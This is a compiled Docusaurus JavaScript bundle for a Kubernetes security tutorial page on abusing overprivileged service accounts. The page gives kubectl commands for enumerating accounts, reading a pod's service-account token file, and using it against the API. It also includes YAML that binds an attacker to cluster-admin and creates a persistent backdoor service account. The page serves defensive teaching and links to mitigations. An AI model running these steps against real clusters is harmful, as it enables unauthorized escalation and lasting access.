"use strict";(self.webpackChunkk_8_s_security=self.webpackChunkk_8_s_security||[]).push([[6590],{3549:(e,s,i)=>{i.r(s),i.d(s,{assets:()=>o,contentTitle:()=>a,default:()=>u,frontMatter:()=>r,metadata:()=>n,toc:()=>l});const n=JSON.parse('{"id":"attack_vectors/privileged_service_accounts","title":"Privileged Service Accounts","description":"How attackers exploit overly privileged Kubernetes Service Accounts to gain cluster-wide access and escalate privileges.","source":"@site/docs/attack_vectors/privileged_service_accounts.md","sourceDirName":"attack_vectors","slug":"/attack_vectors/privileged_service_accounts","permalink":"/docs/attack_vectors/privileged_service_accounts","draft":false,"unlisted":false,"editUrl":"https://github.com/geek-kb/k8s_security/edit/main/docs/attack_vectors/privileged_service_accounts.md","tags":[],"version":"current","lastUpdatedBy":"Itai Ganot","lastUpdatedAt":1742774115000,"sidebarPosition":13,"frontMatter":{"sidebar_position":13,"title":"Privileged Service Accounts","description":"How attackers exploit overly privileged Kubernetes Service Accounts to gain cluster-wide access and escalate privileges."},"sidebar":"default","previous":{"title":"Insecure CSI Drivers","permalink":"/docs/attack_vectors/insecure_csi_drivers"},"next":{"title":"Compromised Sidecars","permalink":"/docs/attack_vectors/compromised_sidecars"}}');var t=i(4848),c=i(8453);const r={sidebar_position:13,title:"Privileged Service Accounts",description:"How attackers exploit overly privileged Kubernetes Service Accounts to gain cluster-wide access and escalate privileges."},a="Privileged Service Accounts",o={},l=[{value:"Exploitation Steps: Abusing Overprivileged Service Accounts",id:"exploitation-steps-abusing-overprivileged-service-accounts",level:2},{value:"1. Enumerate Service Accounts and Roles",id:"1-enumerate-service-accounts-and-roles",level:3},{value:"2. Extract a Service Account Token",id:"2-extract-a-service-account-token",level:3},{value:"3. Escalate Privileges via RBAC Misconfigurations",id:"3-escalate-privileges-via-rbac-misconfigurations",level:3},{value:"4. Establish Persistence via New Service Account",id:"4-establish-persistence-via-new-service-account",level:3},{value:"Result",id:"result",level:3},{value:"Mitigation",id:"mitigation",level:2}];function d(e){const s={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",hr:"hr",li:"li",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,c.R)(),...e.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(s.header,{children:(0,t.jsx)(s.h1,{id:"privileged-service-accounts",children:"Privileged Service Accounts"})}),"\n",(0,t.jsxs)(s.p,{children:["Kubernetes ",(0,t.jsx)(s.strong,{children:"Service Accounts (SAs)"})," are used by pods to authenticate against the Kubernetes API. When overprivileged or misconfigured, they can be exploited by attackers to ",(0,t.jsx)(s.strong,{children:"escalate privileges, gain unauthorized access, and persist within the cluster"}),"."]}),"\n",(0,t.jsx)(s.hr,{}),"\n",(0,t.jsx)(s.h2,{id:"exploitation-steps-abusing-overprivileged-service-accounts",children:"Exploitation Steps: Abusing Overprivileged Service Accounts"}),"\n",(0,t.jsx)(s.p,{children:"An attacker targets insecure or overly permissive Service Accounts to compromise cluster security."}),"\n",(0,t.jsx)(s.h3,{id:"1-enumerate-service-accounts-and-roles",children:"1. Enumerate Service Accounts and Roles"}),"\n",(0,t.jsx)(s.p,{children:"The attacker identifies all existing Service Accounts:"}),"\n",(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-bash",children:"kubectl get serviceaccounts --all-namespaces\n"})}),"\n",(0,t.jsx)(s.p,{children:"Then inspects associated role bindings:"}),"\n",(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-bash",children:"kubectl get clusterrolebindings -o json | jq '.items[] | select(.subjects[].kind==\"ServiceAccount\")'\n"})}),"\n",(0,t.jsxs)(s.p,{children:["They look for accounts with elevated roles like ",(0,t.jsx)(s.code,{children:"cluster-admin"}),"."]}),"\n",(0,t.jsx)(s.hr,{}),"\n",(0,t.jsx)(s.h3,{id:"2-extract-a-service-account-token",children:"2. Extract a Service Account Token"}),"\n",(0,t.jsx)(s.p,{children:"The attacker identifies a pod using a high-privilege Service Account and extracts its token:"}),"\n",(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-bash",children:"kubectl exec -it attacker-pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/token\n"})}),"\n",(0,t.jsx)(s.p,{children:"They decode and use it to access the Kubernetes API:"}),"\n",(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-bash",children:'export TOKEN=<stolen-token>\ncurl -H "Authorization: Bearer $TOKEN" https://<api-server>/api/v1/pods\n'})}),"\n",(0,t.jsxs)(s.p,{children:["This enables ",(0,t.jsx)(s.strong,{children:"API access with elevated privileges"}),"."]}),"\n",(0,t.jsx)(s.hr,{}),"\n",(0,t.jsx)(s.h3,{id:"3-escalate-privileges-via-rbac-misconfigurations",children:"3. Escalate Privileges via RBAC Misconfigurations"}),"\n",(0,t.jsx)(s.p,{children:"If the Service Account has rights to create role bindings, the attacker escalates access:"}),"\n",(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-yaml",children:"apiVersion: rbac.authorization.k8s.io/v1\nkind: RoleBinding\nmetadata:\n  name: escalate-privileges\n  namespace: default\nsubjects:\n  - kind: User\n    name: attacker\n    apiGroup: rbac.authorization.k8s.io\nroleRef:\n  kind: ClusterRole\n  name: cluster-admin\n  apiGroup: rbac.authorization.k8s.io\n"})}),"\n",(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-bash",children:"kubectl apply -f escalate-privileges.yaml\n"})}),"\n",(0,t.jsxs)(s.p,{children:["This grants the attacker ",(0,t.jsx)(s.strong,{children:"cluster-admin rights"}),"."]}),"\n",(0,t.jsx)(s.hr,{}),"\n",(0,t.jsx)(s.h3,{id:"4-establish-persistence-via-new-service-account",children:"4. Establish Persistence via New Service Account"}),"\n",(0,t.jsx)(s.p,{children:"The attacker creates a new Service Account:"}),"\n",(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-yaml",children:"apiVersion: v1\nkind: ServiceAccount\nmetadata:\n  name: persistent-access\n  namespace: default\n"})}),"\n",(0,t.jsxs)(s.p,{children:["And binds it to ",(0,t.jsx)(s.code,{children:"cluster-admin"}),":"]}),"\n",(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-yaml",children:"apiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRoleBinding\nmetadata:\n  name: persist-access\nsubjects:\n  - kind: ServiceAccount\n    name: persistent-access\n    namespace: default\nroleRef:\n  kind: ClusterRole\n  name: cluster-admin\n  apiGroup: rbac.authorization.k8s.io\n"})}),"\n",(0,t.jsxs)(s.p,{children:["This ensures ",(0,t.jsx)(s.strong,{children:"continued access"}),", even if their original access is revoked."]}),"\n",(0,t.jsx)(s.hr,{}),"\n",(0,t.jsx)(s.h3,{id:"result",children:"Result"}),"\n",(0,t.jsxs)(s.p,{children:["The attacker successfully ",(0,t.jsx)(s.strong,{children:"exploits Service Account misconfigurations"})," to:"]}),"\n",(0,t.jsxs)(s.ul,{children:["\n",(0,t.jsx)(s.li,{children:(0,t.jsx)(s.strong,{children:"Access the Kubernetes API"})}),"\n",(0,t.jsx)(s.li,{children:(0,t.jsx)(s.strong,{children:"Escalate to cluster-admin"})}),"\n",(0,t.jsx)(s.li,{children:(0,t.jsx)(s.strong,{children:"Maintain persistent access to the cluster"})}),"\n"]}),"\n",(0,t.jsx)(s.hr,{}),"\n",(0,t.jsx)(s.h2,{id:"mitigation",children:"Mitigation"}),"\n",(0,t.jsxs)(s.p,{children:["\u27a1 ",(0,t.jsx)(s.a,{href:"/docs/best_practices/cluster_setup_and_hardening/rbac_and_identity/service_account_mitigation",children:"Securing Kubernetes Service Accounts"})]})]})}function u(e={}){const{wrapper:s}={...(0,c.R)(),...e.components};return s?(0,t.jsx)(s,{...e,children:(0,t.jsx)(d,{...e})}):d(e)}},8453:(e,s,i)=>{i.d(s,{R:()=>r,x:()=>a});var n=i(6540);const t={},c=n.createContext(t);function r(e){const s=n.useContext(c);return n.useMemo((function(){return"function"==typeof e?e(s):{...s,...e}}),[s,e])}function a(e){let s;return s=e.disableParentContext?"function"==typeof e.components?e.components(t):e.components||t:r(e.components),n.createElement(c.Provider,{value:s},e.children)}}}]);